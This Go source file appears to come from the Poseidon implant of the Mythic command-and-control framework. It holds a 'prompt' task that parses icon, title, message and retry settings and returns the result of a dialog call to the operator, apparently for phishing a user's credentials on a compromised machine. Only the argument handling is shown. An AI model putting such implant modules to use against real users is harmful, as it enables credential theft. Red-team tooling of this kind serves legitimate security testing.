package prompt

import (
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Icon        string
	TitleText   string
	MessageText string
	MaxTries    int
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["icon"]; ok {
		e.Icon = v.(string)
	}
	if v, ok := alias["title"]; ok {
		e.TitleText = v.(string)
	}
	if v, ok := alias["message"]; ok {
		e.MessageText = v.(string)
	}
	if v, ok := alias["max_tries"]; ok {
		e.MaxTries = int(v.(float64))
	}
	return nil
}

// Run - package function to run tcc_check
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	output := prompt(args)
	msg.UserOutput = output
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
